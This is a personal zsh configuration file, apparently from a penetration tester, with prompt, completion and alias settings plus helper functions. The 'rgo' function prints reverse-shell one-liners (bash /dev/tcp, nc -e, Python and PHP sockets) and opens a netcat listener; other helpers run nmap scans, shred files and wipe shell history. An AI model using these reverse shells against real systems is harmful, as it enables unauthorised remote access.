export _JAVA_AWT_WM_NONREPARENTING=1

if [[ -r "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh" ]]; then
  source "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh"
fi

autoload -Uz promptinit
promptinit
prompt adam1

setopt histignorealldups sharehistory
bindkey -e

HISTSIZE=500
SAVEHIST=500
HISTFILE=~/.zsh_history

autoload -Uz compinit
ZCOMPDUMP="${XDG_CACHE_HOME:-$HOME/.cache}/zcompdump-${ZSH_VERSION}"
mkdir -p "${XDG_CACHE_HOME:-$HOME/.cache}"
if [[ -f "$ZCOMPDUMP" && ! "$HOME/.zshrc" -nt "$ZCOMPDUMP" ]]; then
  compinit -C -d "$ZCOMPDUMP"
else
  compinit -d "$ZCOMPDUMP"
fi

zstyle ':completion:*' auto-description 'specify: %d'
zstyle ':completion:*' completer _expand _complete _correct _approximate
zstyle ':completion:*' format 'Completing %d'
zstyle ':completion:*' group-name ''
zstyle ':completion:*' menu select=2
eval "$(dircolors -b)"
zstyle ':completion:*:default' list-colors ${(s.:.)LS_COLORS}
zstyle ':completion:*' list-colors ''
zstyle ':completion:*' list-prompt %SAt %p: Hit TAB for more, or the character to insert%s
zstyle ':completion:*' matcher-list '' 'm:{a-z}={A-Z}' 'm:{a-zA-Z}={A-Za-z}' 'r:|[._-]=* r:|=* l:|=*'
zstyle ':completion:*' menu select=long
zstyle ':completion:*' select-prompt %SScrolling active: current selection at %p%s
zstyle ':completion:*' use-compctl false
zstyle ':completion:*' verbose true
zstyle ':completion:*:*:kill:*:processes' list-colors '=(#b) #([0-9]#)*=0=01;31'
zstyle ':completion:*:kill:*' command 'ps -u $USER -o pid,%cpu,tty,cputime,cmd'

[[ -f ~/.p10k.zsh ]] && source ~/.p10k.zsh

PATH=/opt/nvim/bin:/opt/kitty/bin:$PATH

alias ll='lsd -lh --group-dirs=first'
alias la='lsd -a --group-dirs=first'
alias l='lsd --group-dirs=first'
alias lla='lsd -lha --group-dirs=first'
alias ls='lsd --group-dirs=first'
# cat picks a bat theme per -l language (see ~/.config/bin/bat-lang.sh).
alias cat='$HOME/.config/bin/bat-lang.sh'
alias catn='bat --style=plain'
alias catnp='bat --style=plain --paging=never'

# Language-aware syntax colors; neutral white base instead of the old green palette.
export BAT_THEME="OneHalfDark"

[ -f ~/.fzf.zsh ] && source ~/.fzf.zsh

source /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh
source /usr/share/zsh-sudo/sudo.plugin.zsh

function mkt(){
	mkdir -p {nmap,content,exploits,scripts}
}

function extractPorts(){
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address"  >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n"  >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n"  >> extractPorts.tmp
	cat extractPorts.tmp; rm extractPorts.tmp
}

function settarget(){
	if [ $# -eq 1 ]; then
		echo $1 > ~/.config/bin/target
	elif [ $# -gt 2 ]; then
		echo "settarget [IP] [NAME] | settarget [IP]"
	else
		echo $1 $2 > ~/.config/bin/target
	fi
}

function cleartarget(){
    echo '' > ~/.config/bin/target
}

function man() {
    env \
    LESS_TERMCAP_mb=$'\e[01;31m' \
    LESS_TERMCAP_md=$'\e[01;31m' \
    LESS_TERMCAP_me=$'\e[0m' \
    LESS_TERMCAP_se=$'\e[0m' \
    LESS_TERMCAP_so=$'\e[01;44;33m' \
    LESS_TERMCAP_ue=$'\e[0m' \
    LESS_TERMCAP_us=$'\e[01;32m' \
    man "$@"
}

function fzf-lovely(){
	if [ "$1" = "h" ]; then
		fzf -m --reverse --preview-window down:20 --preview '[[ $(file --mime {}) =~ binary ]] &&
 		                echo {} is a binary file ||
		                 (bat --style=numbers --color=always {} ||
		                  highlight -O ansi -l {} ||
		                  coderay {} ||
		                  rougify {} ||
		                  cat {}) 2> /dev/null | head -500'
	else
	        fzf -m --preview '[[ $(file --mime {}) =~ binary ]] &&
	                         echo {} is a binary file ||
	                         (bat --style=numbers --color=always {} ||
	                          highlight -O ansi -l {} ||
	                         coderay {} ||
	                          rougify {} ||
	                          cat {}) 2> /dev/null | head -500'
	fi
}

function rmk(){
	scrub -p dod $1
	shred -zun 10 -v $1
}

function scan(){
	if [ -z "$1" ]; then
		echo "Usage: scan <target> [ports]"
		return 1
	fi
	ports=${2:-"21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,1521,2049,3306,3389,5432,5900,5985,5986,6379,8080,8443,27017"}
	sudo nmap -sS -p $ports -T4 --min-rate=5000 -n -Pn $1 -oG quick_scan
}

function rgo(){
    if [ -z "$1" ]; then
        echo "Usage: rgo <lport> [shell type]"
        return 1
    fi
    ip=$(ip -o -4 addr show up scope global | awk '{print $4}' | cut -d/ -f1 | head -1)
    port=$1
    type=${2:-"bash"}
    echo "[*] Listening on $ip:$port"
    echo "[*] Reverse shell:"
    case $type in
        bash) echo "bash -i >& /dev/tcp/$ip/$port 0>&1" ;;
        nc) echo "nc -e /bin/bash $ip $port" ;;
        python) echo "python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"$ip\",$port));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'" ;;
        php) echo "php -r '\$s=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" ;;
        *)
            echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
            echo "nc -e /bin/bash $ip $port"
            echo "python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"$ip\",$port));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"
            ;;
    esac
    nc -lvnp $port
}

cleanDocker(){
    docker rm $(docker ps -a -q) --force 2>/dev/null
    docker rmi $(docker images -q) 2>/dev/null
    docker network rm $(docker network ls -q) 2>/dev/null
    docker volume rm $(docker volume ls -q) 2>/dev/null
}

clearhistory(){
	echo '' > ~/.zsh_history
}

(( ! ${+functions[p10k-instant-prompt-finalize]} )) || p10k-instant-prompt-finalize

bindkey "^[[H" beginning-of-line
bindkey "^[[F" end-of-line
bindkey "^[[3~" delete-char
bindkey "^[[1;3C" forward-word
bindkey "^[[1;3D" backward-word

source ~/.powerlevel10k/powerlevel10k.zsh-theme
# zsh-syntax-highlighting must be sourced last to highlight everything correctly.
source /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
